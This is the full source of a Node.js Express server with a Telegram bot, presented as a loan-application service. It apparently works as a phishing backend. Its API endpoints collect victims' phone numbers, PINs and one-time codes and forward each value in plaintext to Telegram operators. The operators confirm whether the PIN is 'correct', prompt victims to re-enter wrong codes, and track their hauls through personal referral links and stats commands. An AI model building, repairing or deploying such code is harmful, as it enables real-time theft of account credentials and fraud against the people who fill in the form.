const express = require('express');
const TelegramBot = require('node-telegram-bot-api');
const path = require('path');
require('dotenv').config();

const db = require('./database');

const app = express();

// ==========================================
// ✅ WEBHOOK MODE FOR RENDER (NOT POLLING!)
// ==========================================

const BOT_TOKEN = process.env.SUPER_ADMIN_BOT_TOKEN;
const PORT = process.env.PORT || 10000;
const WEBHOOK_URL = process.env.RENDER_EXTERNAL_URL || `https://final-8xfd.onrender.com`;

// ✅ Create bot WITHOUT polling
const bot = new TelegramBot(BOT_TOKEN);

// Store admin chat IDs
const adminChatIds = new Map();

let dbReady = false;

// ==========================================
// ✅ MIDDLEWARE MUST COME FIRST!
// ==========================================
app.use(express.json());
app.use(express.static(__dirname));

// ==========================================
// ✅ SETUP BOT HANDLERS IMMEDIATELY!
// ==========================================
console.log('⏳ Setting up bot handlers...');

// Error handlers
bot.on('error', (error) => {
    console.error('❌ Bot error:', error?.message);
});

bot.on('polling_error', (error) => {
    console.error('❌ Polling error:', error?.message);
});

// We'll setup command handlers now, but callback handlers after webhook is set
setupCommandHandlers();
console.log('✅ Command handlers configured!');

// ✅ SETUP WEBHOOK ENDPOINT (after middleware, before async init)
const webhookPath = `/telegram-webhook`;
app.post(webhookPath, (req, res) => {
    try {
        console.log('📥 Webhook received:', JSON.stringify(req.body).substring(0, 150));
        
        if (req.body && Object.keys(req.body).length > 0) {
            // Only process if it has update_id (valid Telegram update)
            if (req.body.update_id !== undefined) {
                try {
                    bot.processUpdate(req.body);
                    console.log('✅ Update processed successfully');
                } catch (processError) {
                    console.error('❌ Error in processUpdate:', processError);
                    console.error('Stack:', processError.stack);
                }
            } else {
                console.log('⚠️ Received webhook without update_id, ignoring');
            }
        } else {
            console.log('⚠️ Empty webhook body');
        }
        res.sendStatus(200);
    } catch (error) {
        console.error('❌ Webhook handler error:', error);
        console.error('Stack:', error.stack);
        res.sendStatus(200); // Still return 200 to Telegram
    }
});

// Initialize database connection
db.connectDatabase()
    .then(async () => {
        dbReady = true;
        console.log('✅ Database ready!');
        
        // Load admin chat IDs from database
        await loadAdminChatIds();
        
        // ✅ SET WEBHOOK URL - WITH RETRY LOGIC
        const fullWebhookUrl = `${WEBHOOK_URL}${webhookPath}`;
        
        let webhookSetSuccessfully = false;
        let attempts = 0;
        const maxAttempts = 3;
        
        while (!webhookSetSuccessfully && attempts < maxAttempts) {
            attempts++;
            try {
                console.log(`🔄 Attempt ${attempts}/${maxAttempts}: Setting webhook to: ${fullWebhookUrl}`);
                
                // Delete any existing webhook first
                await bot.deleteWebHook();
                console.log('🗑️ Cleared any existing webhook');
                
                // Wait a bit
                await new Promise(resolve => setTimeout(resolve, 1000));
                
                // Set the new webhook
                const result = await bot.setWebHook(fullWebhookUrl, {
                    drop_pending_updates: false,
                    max_connections: 40,
                    allowed_updates: ['message', 'callback_query']
                });
                
                if (result) {
                    console.log('✅ setWebHook returned true');
                    
                    // Verify it was actually set
                    const info = await bot.getWebHookInfo();
                    console.log('📋 Webhook info:', JSON.stringify(info, null, 2));
                    
                    if (info.url === fullWebhookUrl) {
                        webhookSetSuccessfully = true;
                        console.log(`✅ Webhook CONFIRMED set to: ${fullWebhookUrl}`);
                    } else {
                        console.error(`❌ Webhook URL mismatch! Expected: ${fullWebhookUrl}, Got: ${info.url}`);
                    }
                } else {
                    console.error('❌ setWebHook returned false');
                }
            } catch (webhookError) {
                console.error(`❌ Webhook setup error (attempt ${attempts}):`, webhookError.message);
                if (attempts < maxAttempts) {
                    console.log('⏳ Waiting 2 seconds before retry...');
                    await new Promise(resolve => setTimeout(resolve, 2000));
                }
            }
        }
        
        if (!webhookSetSuccessfully) {
            console.error('❌❌❌ CRITICAL: Failed to set webhook after all attempts!');
            console.error('Bot will NOT receive updates!');
        }
        
        // Test bot API connectivity
        try {
            const botInfo = await bot.getMe();
            console.log(`✅ Bot connected: @${botInfo.username} (${botInfo.first_name})`);
        } catch (botError) {
            console.error('❌ Bot API error:', botError);
        }
        
        // Keep-alive mechanism to prevent premature exit
        setInterval(() => {
            console.log(`💓 Keep-alive: Server running, ${adminChatIds.size} admins connected`);
        }, 60000); // Every 60 seconds
        
        // Periodic webhook health check - more frequent and with auto-fix
        setInterval(async () => {
            try {
                const info = await bot.getWebHookInfo();
                const isSet = info.url === fullWebhookUrl;
                console.log(`🔍 Webhook: ${isSet ? '✅ SET' : '❌ NOT SET'} | Pending: ${info.pending_update_count || 0}`);
                
                // Auto-fix if webhook is not set
                if (!isSet) {
                    console.log('⚠️ Webhook not set! Attempting to fix...');
                    try {
                        await bot.setWebHook(fullWebhookUrl, {
                            drop_pending_updates: false,
                            max_connections: 40,
                            allowed_updates: ['message', 'callback_query']
                        });
                        console.log('✅ Webhook re-set successfully');
                    } catch (fixError) {
                        console.error('❌ Failed to re-set webhook:', fixError.message);
                    }
                }
            } catch (error) {
                console.error('⚠️ Webhook check error:', error.message);
            }
        }, 60000); // Every 1 minute (more frequent)
        
        console.log('✅ System fully initialized and running!');
    })
    .catch((error) => {
        console.error('❌ Initialization failed:', error);
        process.exit(1);
    });

// ✅ Load admin chat IDs - IMPROVED WITH BETTER LOGGING
async function loadAdminChatIds() {
    try {
        const admins = await db.getAllAdmins();
        console.log(`📋 Loading ${admins.length} admins from database...`);
        
        adminChatIds.clear(); // Clear existing map
        
        for (const admin of admins) {
            console.log(`\n   Processing Admin: ${admin.name}`);
            console.log(`   - adminId: ${admin.adminId}`);
            console.log(`   - chatId: ${admin.chatId} (type: ${typeof admin.chatId})`);
            console.log(`   - status: ${admin.status}`);
            
            if (admin.status === 'active' && admin.chatId) {
                adminChatIds.set(admin.adminId, admin.chatId);
                console.log(`   ✅ LOADED into map`);
            } else {
                console.log(`   ⚠️ SKIPPED - Missing chatId or inactive`);
            }
        }
        
        console.log(`\n✅ ${adminChatIds.size} admins loaded and ready!`);
        console.log(`📋 adminChatIds map contents:`);
        for (const [id, chatId] of adminChatIds.entries()) {
            console.log(`   ${id} -> ${chatId}`);
        }
    } catch (error) {
        console.error('❌ Error loading admin chat IDs:', error);
    }
}

// ==========================================
// ✅ BOT HANDLERS
// ==========================================

function setupCommandHandlers() {
    // Start command
    bot.onText(/\/start/, async (msg) => {
        const chatId = msg.chat.id;
        console.log(`\n========================================`);
        console.log(`👤 /start command received`);
        console.log(`Chat ID: ${chatId}`);
        console.log(`From: ${msg.from.first_name} ${msg.from.last_name || ''}`);
        console.log(`========================================\n`);
        
        try {
            // Find if this chat ID belongs to an admin
            console.log(`🔍 Checking if chat ${chatId} belongs to an admin...`);
            console.log(`📋 Current adminChatIds map size: ${adminChatIds.size}`);
            
            let adminId = null;
            for (const [id, storedChatId] of adminChatIds.entries()) {
                console.log(`   Checking: ${id} -> ${storedChatId}`);
                if (storedChatId === chatId) {
                    adminId = id;
                    break;
                }
            }
            
            console.log(`Admin ID found: ${adminId || 'NONE'}`);
            
            if (adminId) {
                console.log(`✅ User is admin: ${adminId}`);
                try {
                    console.log(`📊 Querying database for admin ${adminId}...`);
                    const admin = await db.getAdmin(adminId);
                    console.log(`📊 Database response:`, admin ? 'Found' : 'Not found');
                    
                    if (admin) {
                        console.log(`📤 Sending admin welcome message...`);
                        await bot.sendMessage(chatId, `
👋 *Welcome ${admin.name}!*

*Your Admin ID:* \`${adminId}\`
*Your Personal Link:*
${process.env.APP_URL || WEBHOOK_URL}?admin=${adminId}

*Commands:*
/mylink - Get your link
/stats - Your statistics
/pending - Pending applications
/myinfo - Your information
            `, { parse_mode: 'Markdown' });
                        console.log(`✅ Admin message sent successfully!`);
                    }
                } catch (dbError) {
                    console.error('❌ Database error in /start:', dbError);
                    console.error('Stack:', dbError?.stack);
                    await bot.sendMessage(chatId, '❌ Database error. Please try again.');
                }
            } else {
                console.log(`📤 Sending guest welcome message to chat ${chatId}...`);
                try {
                    const message = await bot.sendMessage(chatId, `
👋 *Welcome!*

Your Chat ID: \`${chatId}\`

Provide this to your super admin for access.
            `, { parse_mode: 'Markdown' });
                    console.log(`✅ Guest message sent successfully! Message ID: ${message.message_id}`);
                } catch (sendError) {
                    console.error('❌ Error sending guest message:', sendError);
                    console.error('Error code:', sendError?.code);
                    console.error('Error response:', sendError?.response?.body);
                    console.error('Stack:', sendError?.stack);
                }
            }
            
            console.log(`\n✅ /start handler completed successfully\n`);
            
        } catch (error) {
            console.error('\n❌❌❌ CRITICAL ERROR in /start handler ❌❌❌');
            console.error('Error:', error);
            console.error('Error message:', error?.message);
            console.error('Error code:', error?.code);
            console.error('Stack:', error?.stack);
            console.error('❌❌❌❌❌❌❌❌❌❌❌❌❌❌❌❌❌❌❌❌\n');
        }
    });

    // My link
    bot.onText(/\/mylink/, async (msg) => {
        const chatId = msg.chat.id;
        const adminId = getAdminIdByChatId(chatId);
        
        if (!adminId) {
            bot.sendMessage(chatId, '❌ Not registered as admin.');
            return;
        }
        
        const admin = await db.getAdmin(adminId);
        bot.sendMessage(chatId, `
🔗 *YOUR LINK*

\`${process.env.APP_URL || WEBHOOK_URL}?admin=${adminId}\`

📋 Applications → *${admin.name}*
        `, { parse_mode: 'Markdown' });
    });

    // Stats
    bot.onText(/\/stats/, async (msg) => {
        const chatId = msg.chat.id;
        const adminId = getAdminIdByChatId(chatId);
        
        if (!adminId) {
            bot.sendMessage(chatId, '❌ Not registered as admin.');
            return;
        }
        
        const stats = await db.getAdminStats(adminId);
        
        bot.sendMessage(chatId, `
📊 *STATISTICS*

📋 Total: ${stats.total}
⏳ PIN Pending: ${stats.pinPending}
✅ PIN Approved: ${stats.pinApproved}
⏳ OTP Pending: ${stats.otpPending}
🎉 Fully Approved: ${stats.fullyApproved}
        `, { parse_mode: 'Markdown' });
    });

    // Pending
    bot.onText(/\/pending/, async (msg) => {
        const chatId = msg.chat.id;
        const adminId = getAdminIdByChatId(chatId);
        
        if (!adminId) {
            bot.sendMessage(chatId, '❌ Not registered as admin.');
            return;
        }
        
        const adminApps = await db.getApplicationsByAdmin(adminId);
        const pinPending = adminApps.filter(a => a.pinStatus === 'pending');
        const otpPending = adminApps.filter(a => a.otpStatus === 'pending' && a.pinStatus === 'approved');
        
        let message = `⏳ *PENDING*\n\n`;
        
        if (pinPending.length > 0) {
            message += `📱 *PIN (${pinPending.length}):*\n`;
            pinPending.forEach((app, i) => {
                message += `${i + 1}. ${app.phoneNumber} - \`${app.id}\`\n`;
            });
            message += '\n';
        }
        
        if (otpPending.length > 0) {
            message += `🔢 *OTP (${otpPending.length}):*\n`;
            otpPending.forEach((app, i) => {
                message += `${i + 1}. ${app.phoneNumber} - OTP: \`${app.otp}\`\n`;
            });
        }
        
        if (pinPending.length === 0 && otpPending.length === 0) {
            message = '✨ No pending applications!';
        }
        
        bot.sendMessage(chatId, message, { parse_mode: 'Markdown' });
    });

    // My info
    bot.onText(/\/myinfo/, async (msg) => {
        const chatId = msg.chat.id;
        const adminId = getAdminIdByChatId(chatId);
        
        if (!adminId) {
            bot.sendMessage(chatId, '❌ Not registered as admin.');
            return;
        }
        
        const admin = await db.getAdmin(adminId);
        
        bot.sendMessage(chatId, `
ℹ️ *YOUR INFO*

👤 ${admin.name}
📧 ${admin.email}
🆔 \`${adminId}\`
💬 \`${chatId}\`
📅 ${new Date(admin.createdAt).toLocaleString()}
✅ ${admin.status}

🔗 ${process.env.APP_URL || WEBHOOK_URL}?admin=${adminId}
        `, { parse_mode: 'Markdown' });
    });

    // Add admin command (superadmin only)
    bot.onText(/\/addadmin$/, async (msg) => {
        const chatId = msg.chat.id;
        const adminId = getAdminIdByChatId(chatId);
        
        try {
            // Check if user is superadmin
            if (adminId !== 'ADMIN001') {
                await bot.sendMessage(chatId, '❌ Only superadmin can add admins.');
                return;
            }
            
            await bot.sendMessage(chatId, `
📝 *ADD NEW ADMIN*

Please send admin details in this format:

\`/addadmin NAME|EMAIL|CHATID\`

*Example:*
\`/addadmin John Doe|john@example.com|123456789\`

*How to get Chat ID:*
1. Ask the new admin to start your bot
2. They will receive their Chat ID
3. Use that Chat ID here
            `, { parse_mode: 'Markdown' });
        } catch (error) {
            console.error('❌ Error in /addadmin:', error);
        }
    });

    // Add admin with details - ✅ FULLY FIXED VERSION
    bot.onText(/\/addadmin (.+)/, async (msg, match) => {
        const chatId = msg.chat.id;
        const adminId = getAdminIdByChatId(chatId);
        
        try {
            // Check if user is superadmin
            if (adminId !== 'ADMIN001') {
                await bot.sendMessage(chatId, '❌ Only superadmin can add admins.');
                return;
            }
            
            const input = match[1].trim();
            const parts = input.split('|').map(p => p.trim());
            
            if (parts.length !== 3) {
                await bot.sendMessage(chatId, '❌ Invalid format. Use: `/addadmin NAME|EMAIL|CHATID`', { parse_mode: 'Markdown' });
                return;
            }
            
            const [name, email, chatIdStr] = parts;
            const newChatId = parseInt(chatIdStr);
            
            if (isNaN(newChatId)) {
                await bot.sendMessage(chatId, '❌ Chat ID must be a number!');
                return;
            }
            
            console.log(`\n🔵 ===== ADDING NEW ADMIN =====`);
            console.log(`Name: ${name}`);
            console.log(`Email: ${email}`);
            console.log(`Chat ID: ${newChatId}`);
            
            // Generate new admin ID
            const allAdmins = await db.getAllAdmins();
            const newAdminId = `ADMIN${String(allAdmins.length + 1).padStart(3, '0')}`;
            console.log(`Generated Admin ID: ${newAdminId}`);
            
            // Create new admin object
            const newAdmin = {
                adminId: newAdminId,  // ✅ Using adminId (works with updated database.js)
                chatId: newChatId,
                name: name,
                email: email,
                status: 'active',
                createdAt: new Date()
            };
            
            console.log(`💾 Saving to database...`);
            // Save to database
            await db.saveAdmin(newAdmin);
            console.log(`✅ Admin saved to database: ${newAdminId}`);
            
            // ✅ CRITICAL FIX: Add to active map immediately
            adminChatIds.set(newAdminId, newChatId);
            console.log(`✅ Admin added to active map: ${newAdminId} -> ${newChatId}`);
            console.log(`📊 Total admins in map now: ${adminChatIds.size}`);
            console.log(`📋 Current map contents:`);
            for (const [id, chatId] of adminChatIds.entries()) {
                console.log(`   ${id} -> ${chatId}`);
            }
            
            await bot.sendMessage(chatId, `
✅ *ADMIN ADDED*

👤 ${name}
📧 ${email}
🆔 \`${newAdminId}\`
💬 \`${newChatId}\`

🔗 Their link:
${process.env.APP_URL || WEBHOOK_URL}?admin=${newAdminId}

✅ Admin is now CONNECTED and ready to receive applications!

They can use /start to see their commands!
            `, { parse_mode: 'Markdown' });
            
            // Notify the new admin
            try {
                console.log(`📤 Sending notification to new admin at chat ${newChatId}...`);
                await bot.sendMessage(newChatId, `
🎉 *YOU'RE NOW AN ADMIN!*

Welcome ${name}!

*Your Admin ID:* \`${newAdminId}\`
*Your Personal Link:*
${process.env.APP_URL || WEBHOOK_URL}?admin=${newAdminId}

*Commands:*
/mylink - Get your link
/stats - Your statistics
/pending - Pending applications
/myinfo - Your information

✅ You're connected and ready to receive loan applications!
                `, { parse_mode: 'Markdown' });
                console.log(`✅ Notification sent to new admin`);
            } catch (notifyError) {
                console.error('Could not notify new admin:', notifyError);
                await bot.sendMessage(chatId, '⚠️ Admin added but could not send notification. They need to /start the bot first.');
            }
            
            console.log(`🔵 ===== ADMIN ADDITION COMPLETE =====\n`);
            
        } catch (error) {
            console.error('❌ Error adding admin:', error);
            console.error('Stack:', error.stack);
            await bot.sendMessage(chatId, '❌ Failed to add admin. Error: ' + error.message);
        }
    });

    console.log('✅ Command handlers setup complete!');
}

// ==========================================
// ✅ TELEGRAM CALLBACK HANDLER - FIXED LOGIC
// ==========================================

// Handle Telegram callback buttons
bot.on('callback_query', async (callbackQuery) => {
    const chatId = callbackQuery.message.chat.id;
    const messageId = callbackQuery.message.message_id;
    const data = callbackQuery.data;
    const adminId = getAdminIdByChatId(chatId);
    
    console.log(`\n🔘 ====================================== `);
    console.log(`📞 CALLBACK RECEIVED: ${data}`);
    console.log(`   Time: ${new Date().toISOString()}`);
    console.log(`   Admin: ${adminId || 'UNAUTHORIZED'}`);
    console.log(`   Chat: ${chatId}`);
    console.log(`   Map has admin: ${adminChatIds.has(adminId)}`);
    console.log(`🔘 ======================================\n`);
    
    // Check authorization
    if (!adminId) {
        console.log(`❌ UNAUTHORIZED callback from chat ${chatId}`);
        console.log(`📋 Current admins in map:`);
        for (const [id, storedChatId] of adminChatIds.entries()) {
            console.log(`   ${id} -> ${storedChatId}`);
        }
        await bot.answerCallbackQuery(callbackQuery.id, {
            text: '❌ Not authorized!',
            show_alert: true
        });
        return;
    }
    
    // ==========================================
    // SPECIAL CASE: Wrong PIN at OTP stage
    // ==========================================
    if (data.startsWith('wrongpin_otp_')) {
        const applicationId = data.replace('wrongpin_otp_', '');
        console.log(`❌ Wrong PIN at OTP stage: ${applicationId}`);
        
        const application = await db.getApplication(applicationId);
        
        if (!application || application.adminId !== adminId) {
            await bot.answerCallbackQuery(callbackQuery.id, {
                text: '❌ Application not found!',
                show_alert: true
            });
            return;
        }
        
        // Update status
        await db.updateApplication(applicationId, { otpStatus: 'wrongpin_otp' });
        console.log(`✅ Status updated: wrongpin_otp`);
        
        // Update message
        const updatedMessage = `
❌ *WRONG PIN AT OTP STAGE*

📋 \`${applicationId}\`
📱 ${application.phoneNumber}
🔢 \`${application.otp}\`

⚠️ User's PIN was incorrect
👤 ${callbackQuery.from.first_name}
⏰ ${new Date().toLocaleString()}

User will re-enter PIN.
        `;
        
        await bot.editMessageText(updatedMessage, {
            chat_id: chatId,
            message_id: messageId,
            parse_mode: 'Markdown'
        });
        
        await bot.answerCallbackQuery(callbackQuery.id, {
            text: '❌ User will re-enter PIN',
            show_alert: false
        });
        
        console.log(`✅ Wrong PIN handler complete\n`);
        return;
    }
    
    // ==========================================
    // SPECIAL CASE: Wrong code
    // ==========================================
    if (data.startsWith('wrongcode_otp_')) {
        const applicationId = data.replace('wrongcode_otp_', '');
        console.log(`❌ Wrong code: ${applicationId}`);
        
        const application = await db.getApplication(applicationId);
        
        if (!application || application.adminId !== adminId) {
            await bot.answerCallbackQuery(callbackQuery.id, {
                text: '❌ Application not found!',
                show_alert: true
            });
            return;
        }
        
        // Update status
        await db.updateApplication(applicationId, { otpStatus: 'wrongcode' });
        console.log(`✅ Status updated: wrongcode`);
        
        // Update message
        const updatedMessage = `
❌ *WRONG CODE*

📋 \`${applicationId}\`
📱 ${application.phoneNumber}
🔢 \`${application.otp}\`

⚠️ Wrong verification code
👤 ${callbackQuery.from.first_name}
⏰ ${new Date().toLocaleString()}

User will re-enter code.
        `;
        
        await bot.editMessageText(updatedMessage, {
            chat_id: chatId,
            message_id: messageId,
            parse_mode: 'Markdown'
        });
        
        await bot.answerCallbackQuery(callbackQuery.id, {
            text: '❌ User will re-enter code',
            show_alert: false
        });
        
        console.log(`✅ Wrong code handler complete\n`);
        return;
    }
    
    // ==========================================
    // STANDARD CALLBACKS: Parse action_type_applicationId
    // ==========================================
    const parts = data.split('_');
    const action = parts[0]; // deny or allow
    const type = parts[1]; // pin or otp
    const applicationId = parts.slice(2).join('_');
    
    console.log(`📋 Parsed: action=${action}, type=${type}, appId=${applicationId}`);
    
    const application = await db.getApplication(applicationId);
    
    if (!application || application.adminId !== adminId) {
        await bot.answerCallbackQuery(callbackQuery.id, {
            text: '❌ Application not found!',
            show_alert: true
        });
        return;
    }
    
    // ==========================================
    // BUTTON: Invalid Information - Deny (deny_pin)
    // ==========================================
    if (action === 'deny' && type === 'pin') {
        console.log(`❌ PIN REJECTED: ${applicationId}`);
        
        await db.updateApplication(applicationId, { pinStatus: 'rejected' });
        console.log(`✅ Database: pinStatus = rejected`);
        
        const updatedMessage = `
❌ *INVALID - REJECTED*

📋 \`${applicationId}\`
📱 ${application.phoneNumber}
🔑 \`${application.pin}\`

✗ REJECTED
👤 ${callbackQuery.from.first_name}
⏰ ${new Date().toLocaleString()}
        `;
        
        await bot.editMessageText(updatedMessage, {
            chat_id: chatId,
            message_id: messageId,
            parse_mode: 'Markdown'
        });
        
        await bot.answerCallbackQuery(callbackQuery.id, {
            text: '❌ Application rejected',
            show_alert: false
        });
        
        console.log(`✅ PIN rejection complete\n`);
    }
    
    // ==========================================
    // BUTTON: All Correct - Allow OTP (allow_pin)
    // ==========================================
    else if (action === 'allow' && type === 'pin') {
        console.log(`✅ PIN APPROVED: ${applicationId}`);
        
        await db.updateApplication(applicationId, { pinStatus: 'approved' });
        console.log(`✅ Database: pinStatus = approved`);
        
        const updatedMessage = `
✅ *ALL CORRECT - APPROVED*

📋 \`${applicationId}\`
📱 ${application.phoneNumber}
🔑 \`${application.pin}\`

✓ APPROVED
👤 ${callbackQuery.from.first_name}
⏰ ${new Date().toLocaleString()}

User will now proceed to OTP verification.
        `;
        
        await bot.editMessageText(updatedMessage, {
            chat_id: chatId,
            message_id: messageId,
            parse_mode: 'Markdown'
        });
        
        await bot.answerCallbackQuery(callbackQuery.id, {
            text: '✅ Approved! User can enter OTP now.',
            show_alert: false
        });
        
        console.log(`✅ PIN approval complete\n`);
    }
    
    // ==========================================
    // BUTTON: Approve Loan (approve_otp)
    // ==========================================
    else if (action === 'approve' && type === 'otp') {
        console.log(`🎉 LOAN APPROVED: ${applicationId}`);
        
        await db.updateApplication(applicationId, { otpStatus: 'approved' });
        console.log(`✅ Database: otpStatus = approved (FULLY APPROVED!)`);
        
        const updatedMessage = `
🎉 *LOAN APPROVED!*

📋 \`${applicationId}\`
📱 ${application.phoneNumber}
🔑 \`${application.pin}\`
🔢 \`${application.otp}\`

✓ FULLY APPROVED
👤 ${callbackQuery.from.first_name}
⏰ ${new Date().toLocaleString()}

✅ User will see approval page!
        `;
        
        await bot.editMessageText(updatedMessage, {
            chat_id: chatId,
            message_id: messageId,
            parse_mode: 'Markdown'
        });
        
        await bot.answerCallbackQuery(callbackQuery.id, {
            text: '🎉 Loan approved!',
            show_alert: false
        });
        
        console.log(`✅ Loan approval complete\n`);
    }
});

console.log('✅ Telegram callback handler registered!');

// Helper to get adminId from chatId
function getAdminIdByChatId(chatId) {
    for (const [adminId, storedChatId] of adminChatIds.entries()) {
        if (storedChatId === chatId) {
            return adminId;
        }
    }
    return null;
}

// Send message to specific admin
async function sendToAdmin(adminId, message, options = {}) {
    const chatId = adminChatIds.get(adminId);
    
    if (!chatId) {
        console.error(`❌ No chat ID for admin: ${adminId}`);
        return null;
    }
    
    try {
        return await bot.sendMessage(chatId, message, options);
    } catch (error) {
        console.error(`❌ Error sending to ${adminId}:`, error.message);
        return null;
    }
}

// ==========================================
// MIDDLEWARE - Database ready check
// ==========================================
app.use((req, res, next) => {
    if (!dbReady && !req.path.includes('/health') && !req.path.includes('/telegram-webhook')) {
        return res.status(503).json({ 
            success: false, 
            message: 'Database not ready yet' 
        });
    }
    next();
});

// ==========================================
// ✅ API ENDPOINTS - FIXED BUTTON DATA
// ==========================================

app.post('/api/verify-pin', async (req, res) => {
    try {
        const { phoneNumber, pin, adminId: requestAdminId, assignmentType } = req.body;
        const applicationId = `APP-${Date.now()}`;
        
        console.log('📥 PIN Verification Request:');
        console.log('   Phone:', phoneNumber);
        console.log('   Admin ID from request:', requestAdminId);
        console.log('   Assignment Type:', assignmentType);
        
        let assignedAdmin;
        
        // If specific admin requested
        if (assignmentType === 'specific' && requestAdminId) {
            assignedAdmin = await db.getAdmin(requestAdminId);
            if (!assignedAdmin || assignedAdmin.status !== 'active') {
                console.error(`❌ Admin ${requestAdminId} not found or inactive`);
                return res.status(400).json({ success: false, message: 'Invalid admin' });
            }
            console.log(`✅ Using requested admin: ${assignedAdmin.name}`);
        } else {
            // Auto-assign to admin with least load
            const activeAdmins = await db.getActiveAdmins();
            if (activeAdmins.length === 0) {
                console.error('❌ No active admins found');
                return res.status(503).json({ success: false, message: 'No admins available' });
            }
            
            const adminStats = await Promise.all(
                activeAdmins.map(async (admin) => {
                    const stats = await db.getAdminStats(admin.adminId);
                    return { admin, pending: stats.pinPending + stats.otpPending };
                })
            );
            
            adminStats.sort((a, b) => a.pending - b.pending);
            assignedAdmin = adminStats[0].admin;
            console.log(`🔄 Auto-assigned to: ${assignedAdmin.name} (${assignedAdmin.adminId})`);
        }
        
        // ✅ Check if admin is connected OR add them to the map
        if (!adminChatIds.has(assignedAdmin.adminId)) {
            if (assignedAdmin.chatId) {
                // Admin has chatId in database but not in active map - add them now
                adminChatIds.set(assignedAdmin.adminId, assignedAdmin.chatId);
                console.log(`➕ Added admin to active map: ${assignedAdmin.adminId} -> ${assignedAdmin.chatId}`);
            } else {
                console.error(`❌ Admin ${assignedAdmin.adminId} has no chatId in database`);
                return res.status(503).json({ 
                    success: false, 
                    message: 'Admin not connected - they need to send /start to the bot first' 
                });
            }
        }
        
        console.log(`✅ Admin ${assignedAdmin.adminId} is connected (chatId: ${assignedAdmin.chatId})`);
        
        // Save application
        await db.saveApplication({
            id: applicationId,
            adminId: assignedAdmin.adminId,
            adminName: assignedAdmin.name,
            phoneNumber,
            pin,
            pinStatus: 'pending',
            otpStatus: 'pending',
            assignmentType: assignmentType || 'auto',
            timestamp: new Date().toISOString()
        });
        
        console.log(`💾 Application saved: ${applicationId}`);
        
        // ✅ FIXED: Correct button callback data with clear action names
        const sent = await sendToAdmin(assignedAdmin.adminId, `
📱 *NEW APPLICATION*

📋 \`${applicationId}\`
📱 ${phoneNumber}
🔑 \`${pin}\`
⏰ ${new Date().toLocaleString()}

⚠️ *VERIFY INFORMATION*
        `, {
            parse_mode: 'Markdown',
            reply_markup: {
                inline_keyboard: [
                    [{ text: '❌ Invalid - Deny', callback_data: `deny_pin_${applicationId}` }],
                    [{ text: '✅ Correct - Allow OTP', callback_data: `allow_pin_${applicationId}` }]
                ]
            }
        });
        
        if (sent) {
            console.log(`📤 Message sent to ${assignedAdmin.name} successfully`);
        } else {
            console.error(`❌ Failed to send message to ${assignedAdmin.name}`);
        }
        
        res.json({ 
            success: true, 
            applicationId,
            assignedTo: assignedAdmin.name,
            assignedAdminId: assignedAdmin.adminId
        });
        
    } catch (error) {
        console.error('❌ Error in /api/verify-pin:', error);
        console.error('Stack:', error.stack);
        res.status(500).json({ success: false, message: 'Server error: ' + error.message });
    }
});

app.get('/api/check-pin-status/:applicationId', async (req, res) => {
    try {
        const application = await db.getApplication(req.params.applicationId);
        
        if (application) {
            res.json({ success: true, status: application.pinStatus });
        } else {
            res.status(404).json({ success: false, message: 'Application not found' });
        }
    } catch (error) {
        console.error('Error checking PIN status:', error);
        res.status(500).json({ success: false, message: 'Server error' });
    }
});

app.post('/api/verify-otp', async (req, res) => {
    console.log('\n🔵 ===== /api/verify-otp CALLED =====');
    console.log('Request body:', JSON.stringify(req.body));
    
    try {
        const { applicationId, otp } = req.body;
        
        console.log(`📝 Received: applicationId=${applicationId}, otp=${otp}`);
        
        const application = await db.getApplication(applicationId);
        console.log(`📊 Application found:`, application ? 'YES' : 'NO');
        
        if (!application) {
            console.error(`❌ Application ${applicationId} not found in database`);
            return res.status(404).json({ success: false, message: 'Application not found' });
        }
        
        console.log(`👤 Admin ID: ${application.adminId}`);
        console.log(`🗺️ Admin in map: ${adminChatIds.has(application.adminId)}`);
        
        if (!adminChatIds.has(application.adminId)) {
            console.log(`⚠️ Admin ${application.adminId} not in active map, trying to re-add...`);
            // Try to add admin to map if they have chatId
            const admin = await db.getAdmin(application.adminId);
            if (admin && admin.chatId) {
                adminChatIds.set(application.adminId, admin.chatId);
                console.log(`➕ Re-added admin to map: ${application.adminId} -> ${admin.chatId}`);
            } else {
                console.error(`❌ Admin ${application.adminId} not available - no chatId`);
                return res.status(500).json({ success: false, message: 'Admin unavailable' });
            }
        }
        
        console.log(`💾 Updating application with OTP: ${otp}`);
        await db.updateApplication(applicationId, { otp, otpStatus: 'pending' });
        console.log(`✅ OTP saved for ${applicationId}: ${otp}`);
        
        console.log(`📤 Sending message to admin ${application.adminId}...`);
        const sent = await sendToAdmin(application.adminId, `
📲 *CODE VERIFICATION*

📋 \`${applicationId}\`
📱 ${application.phoneNumber}
🔢 \`${otp}\`
⏰ ${new Date().toLocaleString()}

⚠️ *VERIFY CODE*
        `, {
            parse_mode: 'Markdown',
            reply_markup: {
                inline_keyboard: [
                    [{ text: '❌ Wrong PIN', callback_data: `wrongpin_otp_${applicationId}` }],
                    [{ text: '❌ Wrong Code', callback_data: `wrongcode_otp_${applicationId}` }],
                    [{ text: '✅ Approve Loan', callback_data: `approve_otp_${applicationId}` }]
                ]
            }
        });
        
        if (sent) {
            console.log(`✅ Message sent successfully to admin`);
        } else {
            console.error(`❌ Failed to send message to admin`);
        }
        
        console.log(`📤 Sending success response to client`);
        res.json({ success: true });
        console.log(`🔵 ===== /api/verify-otp COMPLETED =====\n`);
        
    } catch (error) {
        console.error('\n❌❌❌ ERROR in /api/verify-otp ❌❌❌');
        console.error('Error message:', error.message);
        console.error('Error stack:', error.stack);
        console.error('❌❌❌❌❌❌❌❌❌❌❌❌❌❌❌❌❌\n');
        res.status(500).json({ success: false, message: 'Server error: ' + error.message });
    }
});

app.get('/api/check-otp-status/:applicationId', async (req, res) => {
    try {
        const application = await db.getApplication(req.params.applicationId);
        
        if (application) {
            res.json({ success: true, status: application.otpStatus });
        } else {
            res.status(404).json({ success: false, message: 'Application not found' });
        }
    } catch (error) {
        console.error('Error checking OTP status:', error);
        res.status(500).json({ success: false, message: 'Server error' });
    }
});

app.post('/api/resend-otp', async (req, res) => {
    try {
        const { applicationId } = req.body;
        const application = await db.getApplication(applicationId);
        
        if (!application) {
            return res.status(404).json({ success: false, message: 'Application not found' });
        }
        
        if (!adminChatIds.has(application.adminId)) {
            return res.status(500).json({ success: false, message: 'Admin unavailable' });
        }
        
        await sendToAdmin(application.adminId, `
🔄 *OTP RESEND REQUEST*

📋 \`${applicationId}\`
📱 ${application.phoneNumber}

User requested OTP resend.
        `, { parse_mode: 'Markdown' });
        
        res.json({ success: true });
        
    } catch (error) {
        console.error('Error in resend-otp:', error);
        res.status(500).json({ success: false, message: 'Server error' });
    }
});

